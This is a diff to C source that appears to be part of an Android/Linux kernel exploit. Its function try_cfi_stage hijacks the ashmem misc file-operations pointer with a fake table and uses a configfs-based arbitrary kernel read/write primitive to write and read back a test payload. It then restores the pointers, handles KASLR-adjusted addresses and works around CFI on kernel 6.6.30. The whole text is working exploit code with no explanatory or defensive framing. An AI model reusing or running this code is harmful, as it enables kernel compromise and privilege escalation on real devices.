@@ -257,47 +257,50 @@ int try_cfi_stage(void) {
 
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
-
-  /* Use physical read to verify fops redirect (CONFIGFS_READ_ITER wrong for 6.6.30) */
-  int phys_ok = pipe_phys_read_data(fd, misc_fops, &pre_fops, sizeof(pre_fops));
-  pr_info("cfi phys read misc_fops=%016zx ok=%d pre_fops=%016llx want=%016zx\n",
-          misc_fops, phys_ok, (unsigned long long)pre_fops, fake_fops);
-
-  if (!phys_ok || pre_fops != fake_fops) {
-    pr_warning("cfi misc_fops verify failed phys_ok=%d pre_fops=%016llx want=%016zx\n",
-               phys_ok, (unsigned long long)pre_fops, fake_fops);
+  ssize_t pre_rb = configfs_read_once(
+      fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
+               "read=%016llx want=%016zx errno=%d\n",
+               pre_rb, misc_fops, (unsigned long long)pre_fops,
+               fake_fops, errno);
     fops_before = pre_fops;
     cfi_last_step = 4;
-    cfi_last_errno = 0;
+    cfi_last_errno = errno;
     goto fail;
   }
 
-  char payload[] = "PHYSICAL_RW_WORKS_ON_6_6_30";
-  /* Use physical write instead of configfs write */
-  int write_ok = pipe_phys_write_data(fd, binwrite_target, payload, sizeof(payload));
-  cfi_write_ret = write_ok ? (ssize_t)sizeof(payload) : -1;
-  pr_info("cfi phys write ok=%d\n", write_ok);
-  if (!write_ok) {
+  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
+  ssize_t n =
+    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
+  cfi_write_ret = n;
+  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
+  if (n != (ssize_t)sizeof(payload)) {
     cfi_last_step = 1;
-    cfi_last_errno = 0;
+    cfi_last_errno = errno;
     goto fail;
   }
   dirty = 1;
   cfi_dirty_seen = 1;
 
-  /* Skip repair_fake_fops_llseek - not needed with physical read/write */
+  if (!repair_fake_fops_llseek(fd)) {
+    cfi_last_step = 2;
+    cfi_last_errno = errno;
+    goto fail;
+  }
   cfi_read_slot_ret = sizeof(uint64_t);
   can_read_back = 1;
 
-  /* Verify payload with physical read */
   char readback[sizeof(payload)];
   memset(readback, 0, sizeof(readback));
-  int read_ok = pipe_phys_read_data(fd, binwrite_target, readback, sizeof(readback));
-  cfi_read_ret = read_ok ? (ssize_t)sizeof(readback) : -1;
-  pr_info("cfi phys read verify ok=%d\n", read_ok);
-  if (!read_ok || memcmp(readback, payload, sizeof(payload)) != 0) {
+  ssize_t r =
+    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
+  cfi_read_ret = r;
+  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
+  if (r != (ssize_t)sizeof(readback) ||
+      memcmp(readback, payload, sizeof(payload)) != 0) {
     cfi_last_step = 3;
-    cfi_last_errno = 0;
+    cfi_last_errno = errno;
     goto fail;
   }
 
@@ -309,25 +312,24 @@ int try_cfi_stage(void) {
   }
 #endif
 
-  /* Restore ASHMEM_MISC_FOPS with physical write */
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
           misc_fops, (unsigned long long)original_fops);
-  int restore_ok = pipe_phys_write_data(fd, misc_fops, &original_fops, sizeof(original_fops));
-  cfi_restore_ret = restore_ok ? (ssize_t)sizeof(original_fops) : -1;
-  if (!restore_ok) {
+  ssize_t restore = configfs_write_once(
+      fd, misc_fops, &original_fops, sizeof(original_fops));
+  cfi_restore_ret = restore;
+  if (restore != (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 5;
-    cfi_last_errno = 0;
+    cfi_last_errno = errno;
     goto fail;
   }
 
-  /* Verify restore with physical read */
   uint64_t before = 0;
-  int rb_ok = pipe_phys_read_data(fd, misc_fops, &before, sizeof(before));
+  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
   fops_before = before;
-  if (!rb_ok || before != original_fops) {
+  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
     cfi_last_step = 6;
-    cfi_last_errno = 0;
+    cfi_last_errno = errno;
     goto fail;
   }
 
@@ -379,26 +381,28 @@ int try_cfi_stage(void) {
   }
 
   uint64_t after = 0;
-  int ra_ok = pipe_phys_read_data(fd, misc_fops, &after, sizeof(after));
+  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
   fops_after = after;
-  if (!ra_ok || after != canon_addr(ASHMEM_FOPS)) {
+  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
     cfi_last_step = 6;
-    cfi_last_errno = 0;
+    cfi_last_errno = errno;
     goto fail;
   }
 
   uint64_t null_owner = 0;
-  int owner_ok = pipe_phys_write_data(fd, fake_fops, &null_owner, sizeof(null_owner));
-  cfi_owner_ret = owner_ok ? (ssize_t)sizeof(null_owner) : -1;
+  ssize_t owner =
+    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
+  cfi_owner_ret = owner;
   SYSCHK(close(fd));
-  if (owner_ok && restore_ok) {
+  if (owner == (ssize_t)sizeof(null_owner) &&
+      restore == (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 0;
     cfi_last_errno = 0;
     atomic_store(&cfi_stage_done, 1);
     return 1;
   }
   cfi_last_step = 7;
-  cfi_last_errno = 0;
+  cfi_last_errno = errno;
   return 0;
 
 fail:
@@ -407,17 +411,19 @@ fail:
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
-    int restore_fail_ok = pipe_phys_write_data(fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
-    cfi_restore_ret = restore_fail_ok ? (ssize_t)sizeof(original_fops_fail) : -1;
-    if (can_read_back && restore_fail_ok) {
+    cfi_restore_ret = configfs_write_once(
+        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
+    if (can_read_back &&
+        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
       uint64_t after_fail = 0;
-      if (pipe_phys_read_data(fd, misc_fops, &after_fail, sizeof(after_fail))) {
+      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
+          (ssize_t)sizeof(after_fail)) {
         fops_after = after_fail;
       }
     }
     uint64_t null_owner_fail = 0;
-    int owner_fail_ok = pipe_phys_write_data(fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
-    cfi_owner_ret = owner_fail_ok ? (ssize_t)sizeof(null_owner_fail) : -1;
+    cfi_owner_ret = configfs_write_once(
+        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
   }
   SYSCHK(close(fd));
   return 0;
